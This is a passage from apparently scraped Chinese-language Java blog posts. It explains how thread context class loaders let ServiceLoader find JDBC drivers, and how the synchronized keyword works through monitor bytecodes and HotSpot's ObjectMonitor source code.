System.out.println(Thread.currentThread().getContextClassLoader()); System.out.println(Thread.class.getClassLoader()); }} 这个程序的输出是： sun.misc.Launcher$AppClassLoader@18b4aac2null 解析：第一行当前的线程是运行MyTest24 的线程，而MyTest24 是由系统类加载器加载，所以打印的是系统类加载器第二行Thread类是java核心库的类，是由启动类加载器加载，所以不打印 null **当前类加载器(Current ClassLoader) ** 每个类都会使用自己的类加载器(即加载自身的类加载器) 来去加载其他类(指的是所依赖的类) ，如果ClassA引用了ClassY，那么ClassX的类加载器就会加载ClassY（前提是ClassY尚未被加载） 线程上下文加载器（Context ClassLoader）线程上下文类加载器是从jdk1.2开始引入的，类Thread中的 getContextCLassLoader() 与setContextClassLoader(ClassLoader classloader) 分别用来获取和设置上下文类加载器，如果没有通过与setContextClassLoader(ClassLoader classloader)进行设置的话，线程将继承其父线程的上下文类加载器。 Java应用运行时的初始线程的上下文加载器是系统类加载器，在线程中运行的代码可以通过该类加载器来加载类与资源。 我们在使用jdbc的时候，不同的数据库的驱动都是由每个厂商自己去实现，开发者在使用的时候，只需要把驱动jar包 ，放到当前path下边就可以了，这些驱动是由系统类加载器加载，而 java.sql 下边的一些Class在使用的时候不可避免的 ，要去使用厂商自定义的实现的逻辑，但是这些 java.sql 下的类的加载器是由启动类加载器完成的加载，由于父加载器(启动类加载器)加载的类无法访问子加载器（系统类加载器或者应用类加载器）加载的类，所以就无法在有些 java.sql 的类去访问具体的厂商实现，这个是双亲委托模型尴尬的一个局面。 线程上下文加载器的重要性： SPI (Service Provider Interface) 父 ClassLoader 可以使用当前线程 Thread.currentThread().getContextClassLoader() 所指定的 classloader 加载的类。 这就改变了父 ClassLoader 不能使用子 ClassLoader 或是其他没有直接父子关系的 CLassLoader 加载的类的情况，即改变了双亲委托模型。 线程上下文加载器就是当前线程的 Current ClassLoader 在双亲委托模型下，类加载器由下至上的，即下层的类加载器会委托上层进行加载。但是对于 SPI 来说，有些接口是 java 核心库所提供的，而java核心库是由启动类加器来加载的，而这些接口的实现来自于不同的jar包（厂商提供），java 的启动类加载器是不会加载其他来源的jar包，这样传统的双亲委托模型就无法满足SPI的要求，而通过给当前线程设置上下文加载器，就可以设置上下文类加载器来实现对于接口实现类的加载。 线程上下文的一般使用模式线程上下文的一般使用模式分为3步，获取、使用和还原，下面是伪代码 // 获取ClassLoader classLoader = Thread.currentThread().getContextClassLoader();try { // 使用 Thread.currentThread().setContextClassLoader(targetClassLoader); method();} finally { // 还原 Thread.currentThread().setContextClassLoader(classLoader);} method 里面调用了 Thread.currentThread().getContextClassLoader()，获取当前线程上下文类加载器做某些事情。如果一个类由类加载器 A 加载，那么这个类的依赖也是有相同的类加载器加载的（如果该依赖类之前没有加载过的话），ContextClassLoader 的作用就是为了破坏 Java 的类加载委托机制。 当高层提供了统一的接口让底层去实现，同时又要在高层加载（或实例化）底层类时，就必须要通过线程上下文类加载器来帮助高层的 ClassLoader 找到并加载该类。 ServiceLoader我们先引入驱动依赖 group 'com.cuzz.jvm'version '1.0'apply plugin: 'java'sourceCompatibility = 1.8repositories { mavenCentral()}dependencies { compile ( &quot;mysql:mysql-connector-java:5.1.34&quot; )} 我们先来看一个例子 /** * @Author: cuzz * @Date: 2019/2/1 14:46 * @Description: */public class MyTest26 { public static void main(String[] args) { ServiceLoader&lt;Driver&gt; serviceLoader = ServiceLoader.load(Driver.class); Iterator&lt;Driver&gt; iterator = serviceLoader.iterator(); while(iterator.hasNext()){ Driver driver = iterator.next(); System.out.println(&quot;driver: &quot;+driver.getClass() + &quot;loader: &quot;+ driver.getClass().getClassLoader() ); } System.out.println(&quot;当前线程上下文类加载器: &quot; + Thread.currentThread().getContextClassLoader()); System.out.println(&quot;ServiceLoader的类加载器: &quot;+ServiceLoader.class.getClassLoader()); }} 输出 driver: class com.mysql.jdbc.Driverloader: sun.misc.Launcher$AppClassLoader@dad5dcdriver: class com.mysql.fabric.jdbc.FabricMySQLDriverloader: sun.misc.Launcher$AppClassLoader@dad5dc当前线程上下文类加载器: sun.misc.Launcher$AppClassLoader@dad5dcServiceLoader的类加载器: null 我们可以看到 ServiceLoader 找到了 mysql 的两个驱动，这两个驱动都是由系统类加载器加载的，当前线程的上下文加载器默认也是系统类加载器，ServiceLoader是由启动类加载器加载，但是程序是怎样找到 mysql 的两个驱动的呢？我们没有在程序里边设置任何的属性或者路径之类的东西让程序能找到 mysql 的驱动，那么我们只能研究一下 ServiceLoader 的源码和文档看一下他们的原理： public final class ServiceLoader&lt;S&gt;extends Objectimplements Iterable&lt;S&gt; A simple service-provider loading facility.A service is a well-known set of interfaces and (usually abstract) classes. A service provider is a specific implementation of a service. The classes in a provider typically implement the interfaces and subclass the classes defined in the service itself. Service providers can be installed in an implementation of the Java platform in the form of extensions, that is, jar files placed into any of the usual extension directories. Providers can also be made available by adding them to the application’s class path or by some other platform-specific means.For the purpose of loading, a service is represented by a single type, that is, a single interface or abstract class. (A concrete class can be used, but this is not recommended.) A provider of a given service contains one or more concrete classes that extend this service type with data and code specific to the provider. The provider class is typically not the entire provider itself but rather a proxy which contains enough information to decide whether the provider is able to satisfy a particular request together with code that can create the actual provider on demand. The details of provider classes tend to be highly service-specific; no single class or interface could possibly unify them, so no such type is defined here. The only requirement enforced by this facility is that provider classes must have a zero-argument constructor so that they can be instantiated during loading.A service provider is identified by placing a provider-configuration file in the resource directory META-INF/services. The file’s name is the fully-qualified binary name of the service’s type. The file contains a list of fully-qualified binary names of concrete provider classes, one per line. Space and tab characters surrounding each name, as well as blank lines, are ignored. The comment character is ‘#’ (‘\\u0023’, NUMBER SIGN); on each line all characters following the first comment character are ignored. The file must be encoded in UTF-8.If a particular concrete provider class is named in more than one configuration file, or is named in the same configuration file more than once, then the duplicates are ignored. The configuration file naming a particular provider need not be in the same jar file or other distribution unit as the provider itself. The provider must be accessible from the same class loader that was initially queried to locate the configuration file; note that this is not necessarily the class loader from which the file was actually loaded.Providers are located and instantiated lazily, that is, on demand. A service loader maintains a cache of the providers that have been loaded so far. Each invocation of the iterator method returns an iterator that first yields all of the elements of the cache, in instantiation order, and then lazily locates and instantiates any remaining providers, adding each one to the cache in turn. The cache can be cleared via the reload method.Service loaders always execute in the security context of the caller. Trusted system code should typically invoke the methods in this class, and the methods of the iterators which they return, from within a privileged security context.Instances of this class are not safe for use by multiple concurrent threads.Unless otherwise specified, passing a null argument to any method in this class will cause a NullPointerException to be thrown.Example Suppose we have a service type com.example.CodecSet which is intended to represent sets of encoder/decoder pairs for some protocol. In this case it is an abstract class with two abstract methods: public abstract Encoder getEncoder(String encodingName); public abstract Decoder getDecoder(String encodingName);Each method returns an appropriate object or null if the provider does not support the given encoding. Typical providers support more than one encoding.If com.example.impl.StandardCodecs is an implementation of the CodecSet service then its jar file also contains a file named META-INF/services/com.example.CodecSetThis file contains the single line: com.example.impl.StandardCodecs # Standard codecsThe CodecSet class creates and saves a single service instance at initialization:` private static ServiceLoader&lt;CodecSet&gt; codecSetLoader = ServiceLoader.load(CodecSet.class); To locate an encoder for a given encoding name it defines a static factory method which iterates through the known and available providers, returning only when it has located a suitable encoder or has run out of providers. public static Encoder getEncoder(String encodingName) { for (CodecSet cp : codecSetLoader) Encoder enc = cp.getEncoder(encodingName); if (enc != null) return enc; } return null; } A getDecoder method is defined similarly.Usage Note If the class path of a class loader that is used for provider loading includes remote network URLs then those URLs will be dereferenced in the process of searching for provider-configuration files.This activity is normal, although it may cause puzzling entries to be created in web-server logs. If a web server is not configured correctly, however, then this activity may cause the provider-loading algorithm to fail spuriously.A web server should return an HTTP 404 (Not Found) response when a requested resource does not exist. Sometimes, however, web servers are erroneously configured to return an HTTP 200 (OK) response along with a helpful HTML error page in such cases. This will cause a ServiceConfigurationError to be thrown when this class attempts to parse the HTML page as a provider-configuration file. The best solution to this problem is to fix the misconfigured web server to return the correct response code (HTTP 404) along with the HTML error page. 我们先看源码 public final class ServiceLoader&lt;S&gt; implements Iterable&lt;S&gt; { // 前缀 private static final String PREFIX = &quot;META-INF/services/&quot;; // The class or interface representing the service being loaded private final Class&lt;S&gt; service; // The class loader used to locate, load, and instantiate providers private final ClassLoader loader; // The access control context taken when the ServiceLoader is created private final AccessControlContext acc; // Cached providers, in instantiation order private LinkedHashMap&lt;String,S&gt; providers = new LinkedHashMap&lt;&gt;(); // The current lazy-lookup iterator private LazyIterator lookupIterator; ...} 该类中有个常量 PREFIX ，根据文档我们可以知道这是一个目录，我们看看 mysql-connnector-java 中也有 其下的文件名字就是服务的名字，比如数据库驱动的服务是java.sql.Drive，我们在mysql的jar包下可以看到这个文件，文件里边的内容是具体的实现类的全限定名： com.mysql.jdbc.Drivercom.mysql.fabric.jdbc.FabricMySQLDriver 与前面打印出来的驱动是一样的 ServiceLoader 是由启动类加载器加载的，为什么 mysql 的驱动是由系统类加载器加载呢？ 前面代码中 ServiceLoader serviceLoader = ServiceLoader.load(Driver.class); 这段代码是怎么起作用的呢，跟进源码 public static &lt;S&gt; ServiceLoader&lt;S&gt; load(Class&lt;S&gt; service) { // 获取当前上下文类加载，并使用上下文类加载器去加载 ClassLoader cl = Thread.currentThread().getContextClassLoader(); return ServiceLoader.load(service, cl);}public static &lt;S&gt; ServiceLoader&lt;S&gt; load(Class&lt;S&gt; service, ClassLoader loader) { // 调用一个构造方法 return new ServiceLoader&lt;&gt;(service, loader);} 既然 ServiceLoader 是由启动类加载器加载，那么 ServiceLoader 里边的类都会用启动类加载器去加载，但是呢我们的 mysql 驱动不在启动类加载器加载的目录下边，我们的 mysql 驱动位于 classpath 下边，无法用启动类加载器加载，这个时候，我们可以看到 load 方法使用了线程上下文加载器，线程上下文加载器默认是系统类加载器 我们来看看这个构造方法 private ServiceLoader(Class&lt;S&gt; svc, ClassLoader cl) { service = Objects.requireNonNull(svc, &quot;Service interface cannot be null&quot;); loader = (cl == null) ? ClassLoader.getSystemClassLoader() : cl; acc = (System.getSecurityManager() != null) ? AccessController.getContext() : null; reload(); }// 调用reload() 方法 public void reload() { // 清空缓存 providers = new LinkedHashMap&lt;&gt;(); providers.clear(); // 懒加载 lookupIterator = new LazyIterator(service, loader); } LazyIterator 类 java.util.ServiceLoader.LazyIterator private class LazyIterator implements Iterator&lt;S&gt; { Class&lt;S&gt; service; ClassLoader loader; Enumeration&lt;URL&gt; configs = null; Iterator&lt;String&gt; pending = null; String nextName = null; private LazyIterator(Class&lt;S&gt; service, ClassLoader loader) { this.service = service; this.loader = loader; } private boolean hasNextService() { if (nextName != null) { return true; } if (configs == null) { try { String fullName = PREFIX + service.getName(); if (loader == null) configs = ClassLoader.getSystemResources(fullName); else configs = loader.getResources(fullName); } catch (IOException x) { fail(service, &quot;Error locating configuration files&quot;, x); } } while ((pending == null) || !pending.hasNext()) { if (!configs.hasMoreElements()) { return false; } pending = parse(service, configs.nextElement()); } nextName = pending.next(); return true; } private S nextService() { if (!hasNextService()) throw new NoSuchElementException(); String cn = nextName; nextName = null; Class&lt;?&gt; c = null; try { c = Class.forName(cn, false, loader); } catch (ClassNotFoundException x) { fail(service, &quot;Provider &quot; + cn + &quot; not found&quot;); } if (!service.isAssignableFrom(c)) { fail(service, &quot;Provider &quot; + cn + &quot; not a subtype&quot;); } try { S p = service.cast(c.newInstance()); providers.put(cn, p); return p; } catch (Throwable x) { fail(service, &quot;Provider &quot; + cn + &quot; could not be instantiated&quot;, x); } throw new Error(); // This cannot happen } public boolean hasNext() { if (acc == null) { return hasNextService(); } else { PrivilegedAction&lt;Boolean&gt; action = new PrivilegedAction&lt;Boolean&gt;() { public Boolean run() { return hasNextService(); } }; return AccessController.doPrivileged(action, acc); } } public S next() { if (acc == null) { return nextService(); } else { PrivilegedAction&lt;S&gt; action = new PrivilegedAction&lt;S&gt;() { public S run() { return nextService(); } }; return AccessController.doPrivileged(action, acc); } } public void remove() { throw new UnsupportedOperationException(); }} 这样就把驱动加载出来了，则前面代码输出 driver: class com.mysql.jdbc.Driverloader: sun.misc.Launcher$AppClassLoader@dad5dcdriver: class com.mysql.fabric.jdbc.FabricMySQLDriverloader: sun.misc.Launcher$AppClassLoader@dad5dc当前线程上下文类加载器: sun.misc.Launcher$AppClassLoader@dad5dcServiceLoader的类加载器: null 如果我们把前面代码改一下，设置当前线程的上下文类加载器为扩展类加载器 public class MyTest26 { public static void main(String[] args) { // 把当前线程设置为扩展类加载器 Thread.currentThread().setContextClassLoader(MyTest26.class.getClassLoader().getParent()); ServiceLoader&lt;Driver&gt; serviceLoader = ServiceLoader.load(Driver.class); Iterator&lt;Driver&gt; iterator = serviceLoader.iterator(); while(iterator.hasNext()){ Driver driver = iterator.next(); System.out.println(&quot;driver: &quot;+driver.getClass() + &quot;loader: &quot;+ driver.getClass().getClassLoader() ); } System.out.println(&quot;当前线程上下文类加载器: &quot; + Thread.currentThread().getContextClassLoader()); System.out.println(&quot;ServiceLoader的类加载器: &quot;+ServiceLoader.class.getClassLoader()); }} 则输出 当前线程上下文类加载器: sun.misc.Launcher$ExtClassLoader@a14482ServiceLoader的类加载器: null 可以看到循环没有去执行，上下文类加载器是扩展类加载器没啥问题，因为系统类加载器的上级是扩展类加载器，但是为什么循环是空的呢？原因就是扩展类加载器无法加载 classpath下边的类，mysql 的 jar 包是放在 classpath下边的。","link":"/2019/01/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Java%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%88%E4%BA%8C%EF%BC%89/"},{"title":"深入理解 synchronized 关键字","text":"如果某一个资源被多个线程共享，为了避免因为资源抢占导致资源数据错乱，我们需要对线程进行同步，那么synchronized就是实现线程同步的关键字，是用来保证被锁定了代码同一时间只能有一个线程执行，那么synchronized关键字的实现原理是怎样的呢？ 先给出一张图，看看 synchronized 这个关键字有多复杂，先看看能看懂多少，如果看不太懂，希望看完本文能真正理解 synchronized 关键字和这张图。 synchronized 用法synchronized 在用法上可以分为如下四种：普通方法、对象、静态方法和类。 1、普通方法 public synchronized void method() {} 2、对象 public void method() { synchronized(obj) { }} 3、静态方法 public static synchronized void method() {} 4、类 public static void method() { synchronized(Obj.class) { }} 但是我们要知道，syncnronized 锁的并不是代码块而是对象，锁静态方法也是锁住这个类。 synchronized 特性 原子性 可见性 有序性 可重入性 synchronized 实现原理字节码通过查看字节码来看看 synchronized 在字节码程度实现。 1、先看看在 synchronized 修饰在方法上 public synchronized void method() {} 我们进入到编译后的 classes 目录下，找到对应的类，使用 javap -v XX.class public synchronized void method(); descriptor: ()V flags: (0x0021) ACC_PUBLIC, ACC_SYNCHRONIZED // 注意这个 Code: stack=0, locals=1, args_size=1 0: return LineNumberTable: line 13: 0 LocalVariableTable: Start Length Slot Name Signature 0 1 0 this Lcom/cuzz/syn/Test; 我们发现在 flags 上有一个 ACC_SYNCHRONIZED 标识。 2、对象上 public void method() { synchronized(obj) { }} 反编译结果，在字节码成面上有 monitorenter 和 monitorexit，其中后面一个 monitorexit 表示异常退出。 public void method(); descriptor: ()V flags: (0x0001) ACC_PUBLIC Code: stack=2, locals=3, args_size=1 0: aload_0 1: getfield #3 4: dup 5: astore_1 6: monitorenter // ---&gt; 进入 7: aload_1 8: monitorexit // ---&gt; 退出 9: goto 17 12: astore_2 13: aload_1 14: monitorexit // ---&gt; 异常退出 15: aload_2 16: athrow 17: return montor1、monitorenter JVM 规范中描述 Each object is associated with a monitor. A monitor is locked if and only if it has an owner. The thread that executes monitorenter attempts to gain ownership of the monitor associated with objectref, as follows: If the entry count of the monitor associated with objectref is zero, the thread enters the monitor and sets its entry count to one. The thread is then the owner of the monitor. If the thread already owns the monitor associated with objectref， it reenters the monitor， incrementing its entry count. If another thread already owns the monitor associated with objectref， the thread blocks until the monitor’s entry count is zero， then tries again to gain ownership. 2、monitorexit JVM 规范中描述 The thread that executes monitorexit must be the owner of the monitor associated with the instance referenced by objectref. The thread decrements the entry count of the monitor associated with objectref. If as a result the value of the entry count is zero， the thread exits the monitor and is no longer its owner. Other threads that are blocking to enter the monitor are allowed to attempt to do so. 小结通过 javap 反汇编我们看到 synchronized 使用编程了 monitorentor 和 monitorexit 两个指令： 每个锁对象都会关联一个 monitor （监视器它才是真正的锁对象）。 它内部有两个重要的成员变量 owner 会保存获得锁的线程，recursions 会保存线程获得锁的次数。 当执行到 monitorenter 时，recursions 会+1；当执行到 monitorexit 时，recursions会-1，当计数器减到 0 时这个线程就会释放锁。 同步方法在反汇编后，会增加 ACC_SYNCHRONIZED 修饰，会隐式调用 monitorenter 和 monitorexit。在执行同步方法前会调用 monitorenter，在执行完同步方法后会调用 monitorexit。 深入 JVM 源码monitor 监视锁先下载 JVM 源码， https://github.com/openjdk/jdk 导入 CLion 中，切到 1.8 tag 上。 在HotSpot虚拟机中，monitor 是由 ObjectMonitor 实现的。其源码是用 C++ 来实现的，位于HotSpot虚 拟机源码 ObjectMonitor.hpp 文件中(src/share/vm/runtime/objectMonitor.hpp)。ObjectMonitor 主要数据结构如下: ObjectMonitor() { _header = NULL; _count = 0; // 用来记录该对象被线程获取锁的次数 _waiters = 0, _recursions = 0; // 线程的重入次数 _object = NULL; // 储存改monitor的对象 _owner = NULL; // 标识拥有该monitor的线程 _WaitSet = NULL; // 处于wait状态的线程，会加入到其中 _WaitSetLock = 0 ; _Responsible = NULL ; _succ = NULL ; _cxq = NULL ; // 多线程竞争锁的单向列表 FreeNext = NULL ; _EntryList = NULL ; // 处于等待锁block状态的线程，会加入该列表 _SpinFreq = 0 ; _SpinClock = 0 ; OwnerIsThread = 0 ;} 关键属性解释： _owner：初始时为NULL，当有线程占有该monitor时，owner标记为该线程的唯一标识。当线程释放monitor时，owner又恢复为NULL，owner是一个临界资源，JVM是通过CAS操作来保证其线程安全的。 _cxq：竞争队列，所有请求锁的线程首先会被放在这个队列中（单向链表）。_cxq是一个临界资 源，JVM通过CAS原子指令来修改_cxq队列。修改前_cxq的旧值填入了node的next字段，_cxq指向新值(新线程)。因此_cxq是一个后进先出的栈。 _EntryList：_cxq队列中有资格成为候选资源的线程会被移动到该队列中。 _WaitSet：因为调用wait方法而被阻塞的线程会被放在该队列中。 具体过程： 当多个线程同时访问该方法，那么这些线程会先被放进_EntryList队列，此时线程处于blocking状态 当一个线程获取到了实例对象的监视器（monitor）锁，那么就可以进入running状态，执行方法，此时，ObjectMonitor对象_owner指向当前线程，_count加1表示当前对象锁被一个线程获取 当running状态的线程调用wait()方法，那么当前线程释放monitor对象，进入waiting状态，ObjectMonitor对象的_owner变为null，同时线程进入_WaitSet队列，直到有线程调用notify()方法唤醒该线程，则该线程重新获取monitor对象进入_Owner区 如果当前线程执行完毕，那么也释放monitor对象，进入waiting状态，ObjectMonitor对象的_owner变为 null ObjectMonitor 的数据结构中包含：_owner、_WaitSet 和 _EntryList，它们之间的关系转换可以用下图表示: 每一个 Java 对象都可以与一个监视器 monitor 关联，我们可以把它理解成为一把锁，当一个线程想要执行一段被 synchronized 圈起来的同步方法或者代码块时，该线程得先获取到 synchronized 修饰的对象对应的monitor。 我们的 Java 代码里不会显示地去创造这么一个monitor对象，我们也无需创建，事实上可以这么理解： monitor并不是随着对象创建而创建的。 我们是通过synchronized修饰符告诉 JVM 需要为我们的某个对象创建关联的monitor对象。 每个线程都存在两个ObjectMonitor 对象列表，分别为free和used列表。 同时JVM中也维护着global locklist。 当线程需要ObjectMonitor对象时，首先从线程自身的free表中申请，若存在则使用，若不存在则从global list中申请。 monitor 竞争在字节码上 monitorenter，最终会调用 InterpreterRuntime.cpp IRT_ENTRY_NO_ASYNC(void, InterpreterRuntime::monitorenter(JavaThread* thread, BasicObjectLock* elem))#ifdef ASSERT thread-&gt;last_frame().interpreter_frame_verify_monitor(elem);#endif if (PrintBiasedLockingStatistics) { Atomic::inc(BiasedLocking::slow_path_entry_count_addr()); } Handle h_obj(thread, elem-&gt;obj()); assert(Universe::heap()-&gt;is_in_reserved_or_null(h_obj()), &quot;must be NULL or an object&quot;); // 是否使用偏向锁 if (UseBiasedLocking) { // Retry fast entry if bias is revoked to avoid unnecessary inflation ObjectSynchronizer::fast_enter(h_obj, elem-&gt;lock(), true, CHECK); } else { ObjectSynchronizer::slow_enter(h_obj, elem-&gt;lock(), CHECK); } assert(Universe::heap()-&gt;is_in_reserved_or_null(elem-&gt;obj()), &quot;must be NULL or an object&quot;);#ifdef ASSERT thread-&gt;last_frame().interpreter_frame_verify_monitor(elem);#endifIRT_END 最终调用 ObjectMonitor::enter 方法 void ATTR ObjectMonitor::enter(TRAPS) { // The following code is ordered to check the most common cases first // and to reduce RTS-&gt;RTO cache line upgrades on SPARC and IA32 processors. Thread * const Self = THREAD ; void * cur ; // _owner为NULL表示无锁 // 通过CAS操作吧monitor的_owner字段设置为当前线程 // 这个会根据不同的操作系统有不同的实现如果是Linux，则在atomic_linux_x86.inline.hpp中 // 返回旧值 cur = Atomic::cmpxchg_ptr (Self, &amp;_owner, NULL) ; // 设置成功 if (cur == NULL) { // Either ASSERT _recursions == 0 or explicitly set _recursions = 0. assert (_recursions == 0 , &quot;invariant&quot;) ; assert (_owner == Self, &quot;invariant&quot;) ; // CONSIDER: set or assert OwnerIsThread == 1 return ; } // 线程重入，_recursions++ if (cur == Self) { // TODO-FIXME: check for integer overflow! BUGID 6557169. _recursions ++ ; return ; } // 如果当前线程是第一次进入该monitor,设置_recursions为1，_owner为当前线程 // 当前线程是之前持有轻量级锁的线程。由轻量级锁膨胀且第一次调用enter方法，那cur是指向Lock Record的指针 if (Self-&gt;is_lock_owned ((address)cur)) { assert (_recursions == 0, &quot;internal state error&quot;); _recursions = 1 ; // Commute owner from a thread-specific on-stack BasicLockObject address to // a full-fledged &quot;Thread *&quot;. _owner = Self ; OwnerIsThread = 1 ; return ; } ... // 在调用系统的同步操作之前，先尝试自旋获得锁 if (Knob_SpinEarly &amp;&amp; TrySpin (Self) &gt; 0) { ... //自旋的过程中获得了锁，则直接返回 Self-&gt;_Stalled = 0 ; return ; } // 通过自旋执行ObjectMonitor::EnterI方法等待锁的释放 for (;;) { jt-&gt;set_suspend_equivalent(); // cleared by handle_special_suspend_equivalent_condition() // or java_suspend_self() EnterI (THREAD) ; if (!ExitSuspendEquivalent(jt)) break ; // // We have acquired the contended monitor, but while we were // waiting another thread suspended us. We don't want to enter // the monitor while suspended because that would surprise the // thread that suspended us. // _recursions = 0 ; _succ = NULL ; exit (Self) ; jt-&gt;java_suspend_self(); } Self-&gt;set_current_pending_monitor(NULL);} 代码具体逻辑： 通过CAS尝试吧monItor的_owner设置为当前线程 如果设置之前的_owner指向当前线程，说明线程再次进入monitor，为重入锁，_recursions++，记录重入得次数 如果当前线程是第一次进入monitor，设置_recursions为1，_owner为当前线程，改线程获得锁 如果获得锁失败，则等待锁的释放 monitor 等待竞争失败等待调用的是ObjectMonitor对象的EnterI方法。 void ATTR ObjectMonitor::EnterI (TRAPS) { Thread * Self = THREAD ; ... // 尝试获得锁 if (TryLock (Self) &gt; 0) { ... return ; } DeferredInitialize () ; // 自旋 if (TrySpin (Self) &gt; 0) { ... return ; } ... // 将线程封装成node节点中 ObjectWaiter node(Self) ; Self-&gt;_ParkEvent-&gt;reset() ; node._prev = (ObjectWaiter *) 0xBAD ; node.TState = ObjectWaiter::TS_CXQ ; // 将node节点插入到_cxq队列的头部，cxq是一个单向链表 ObjectWaiter * nxt ; for (;;) { node._next = nxt = _cxq ; if (Atomic::cmpxchg_ptr (&amp;node, &amp;_cxq, nxt) == nxt) break ; // CAS失败的话 再尝试获得锁，这样可以降低插入到_cxq队列的频率 if (TryLock (Self) &gt; 0) { ... return ; } } // SyncFlags默认为0，如果没有其他等待的线程，则将_Responsible设置为自己 if ((SyncFlags &amp; 16) == 0 &amp;&amp; nxt == NULL &amp;&amp; _EntryList == NULL) { Atomic::cmpxchg_ptr (Self, &amp;_Responsible, NULL) ; } TEVENT (Inflated enter - Contention) ; int nWakeups = 0 ; int RecheckInterval = 1 ; for (;;) { // 线程在被挂起前再尝试一次，看能不能获得到锁 if (TryLock (Self) &gt; 0) break ; assert (_owner != Self, &quot;invariant&quot;) ; ... // park self if (_Responsible == Self || (SyncFlags &amp; 1)) { // 当前线程是_Responsible时，调用的是带时间参数的park TEVENT (Inflated enter - park TIMED) ; Self-&gt;_ParkEvent-&gt;park ((jlong) RecheckInterval) ; // Increase the RecheckInterval, but clamp the value. RecheckInterval *= 8 ; if (RecheckInterval &gt; 1000) RecheckInterval = 1000 ; } else { //否则直接调用park挂起当前线程 TEVENT (Inflated enter - park UNTIMED) ; Self-&gt;_ParkEvent-&gt;park() ; } if (TryLock(Self) &gt; 0) break ; ... if ((Knob_SpinAfterFutile &amp; 1) &amp;&amp; TrySpin (Self) &gt; 0) break ; ... // 在释放锁时，_succ会被设置为EntryList或_cxq中的一个线程 if (_succ == Self) _succ = NULL ; // Invariant: after clearing _succ a thread *must* retry _owner before parking. OrderAccess::fence() ; } // 走到这里说明已经获得锁了 assert (_owner == Self , &quot;invariant&quot;) ; assert (object() != NULL , &quot;invariant&quot;) ; // 将当前线程的node从cxq或EntryList中移除 UnlinkAfterAcquire (Self, &amp;node) ; if (_succ == Self) _succ = NULL ; if (_Responsible == Self) { _Responsible = NULL ; OrderAccess::fence(); } ... return ;} 当线程被唤醒时，会从挂起点继续执行，通过ObjectMonitor::TryLock尝试获取锁。 int ObjectMonitor::TryLock (Thread * Self) { for (;;) { void * own = _owner ; if (own != NULL) return 0 ; if (Atomic::cmpxchg_ptr (Self, &amp;_owner, NULL) == NULL) { // Either guarantee _recursions == 0 or set _recursions = 0. assert (_recursions == 0, &quot;invariant&quot;) ; assert (_owner == Self, &quot;invariant&quot;) ; // CONSIDER: set or assert that OwnerIsThread == 1 return 1 ; } // The lock had been free momentarily, but we lost the race to the lock. // Interference -- the CAS failed. // We can either return -1 or retry. // Retry doesn't make as much sense because the lock was just acquired. if (true) return -1 ; }} 上面代码具体流程： 将当前线程插入到cxq队列的队首 然后park当前线程 当被唤醒后再尝试获得锁 monitor 释放当某个持有锁的线程执行完同步代码块时，会进行锁的释放，给其它线程机会执行同步代码，在 HotSpot中，通过退出monitor的方式实现锁的释放，并通知被阻塞的线程，具体实现位于 ObjectMonitor的exit方法中。 void ATTR ObjectMonitor::exit(TRAPS) { Thread * Self = THREAD ; ... // 看看_recursions 是否为0 if (_recursions != 0) { _recursions--; // this is simple recursive enter TEVENT (Inflated exit - recursive) ; return ; } // Invariant: after setting Responsible=null an thread must execute // a MEMBAR or other serializing instruction before fetching EntryList|cxq. if ((SyncFlags &amp; 4) == 0) { _Responsible = NULL ; } for (;;) { assert (THREAD == _owner, &quot;invariant&quot;) ; guarantee (_owner == THREAD, &quot;invariant&quot;) ; ObjectWaiter * w = NULL ; int QMode = Knob_QMode ; // QMode = 2:直接绕过EntryList队列，从_cxq队列中获取线程用于竞争锁 if (QMode == 2 &amp;&amp; _cxq != NULL) { w = _cxq ; assert (w != NULL, &quot;invariant&quot;) ; assert (w-&gt;TState == ObjectWaiter::TS_CXQ, &quot;Invariant&quot;) ; ExitEpilog (Self, w) ; return ; } // Qmode = 3: _cxq队列插入EntryList尾部 if (QMode == 3 &amp;&amp; _cxq != NULL) { w = _cxq ; for (;;) { assert (w != NULL, &quot;Invariant&quot;) ; ObjectWaiter * u = (ObjectWaiter *) Atomic::cmpxchg_ptr (NULL, &amp;_cxq, w) ; if (u == w) break ; w = u ; } assert (w != NULL , &quot;invariant&quot;) ; ObjectWaiter * q = NULL ; ObjectWaiter * p ; for (p = w ; p != NULL ; p = p-&gt;_next) { guarantee (p-&gt;TState == ObjectWaiter::TS_CXQ, &quot;Invariant&quot;) ; p-&gt;TState = ObjectWaiter::TS_ENTER ; p-&gt;_prev = q ; q = p ; } // Append the RATs to the EntryList // TODO: organize EntryList as a CDLL so we can locate the tail in constant-time. ObjectWaiter * Tail ; for (Tail = _EntryList ; Tail != NULL &amp;&amp; Tail-&gt;_next != NULL ; Tail = Tail-&gt;_next) ; if (Tail == NULL) { _EntryList = w ; } else { Tail-&gt;_next = w ; w-&gt;_prev = Tail ; } // Fall thru into code that tries to wake a successor from EntryList } // Qmode = 4: _cxq队列插入EntryList头部 if (QMode == 4 &amp;&amp; _cxq != NULL) { w = _cxq ; for (;;) { assert (w != NULL, &quot;Invariant&quot;) ; ObjectWaiter * u = (ObjectWaiter *) Atomic::cmpxchg_ptr (NULL, &amp;_cxq, w) ; if (u == w) break ; w = u ; } assert (w != NULL , &quot;invariant&quot;) ; ObjectWaiter * q = NULL ; ObjectWaiter * p ; for (p = w ; p != NULL ; p = p-&gt;_next) { guarantee (p-&gt;TState == ObjectWaiter::TS_CXQ, &quot;Invariant&quot;) ; p-&gt;TState = ObjectWaiter::TS_ENTER ; p-&gt;_prev = q ; q = p ; } // Prepend the RATs to the EntryList if (_EntryList != NULL) { q-&gt;_next = _EntryList ; _EntryList-&gt;_prev = q ; } _EntryList = w ; // Fall thru into code that tries to wake a successor from EntryList } w = _EntryList ; if (w != NULL) { assert (w-&gt;TState == ObjectWaiter::TS_ENTER, &quot;invariant&quot;) ; ExitEpilog (Self, w) ; return ; } // If we find that both _cxq and EntryList are null then just // re-run the exit protocol from the top. w = _cxq ; if (w == NULL) continue ; // Drain _cxq into EntryList - bulk transfer. // First, detach _cxq. // The following loop is tantamount to: w = swap (&amp;cxq, NULL) for (;;) { assert (w != NULL, &quot;Invariant&quot;) ; ObjectWaiter * u = (ObjectWaiter *) Atomic::cmpxchg_ptr (NULL, &amp;_cxq, w) ; if (u == w) break ; w = u ; } TEVENT (Inflated exit - drain cxq into EntryList) ; assert (w != NULL , &quot;invariant&quot;) ; assert (_EntryList == NULL , &quot;invariant&quot;) ; // QMode = 1 : 将_cxq中的元素转移到EntryList，并反转顺序 if (QMode == 1) { // QMode == 1 : drain cxq to EntryList, 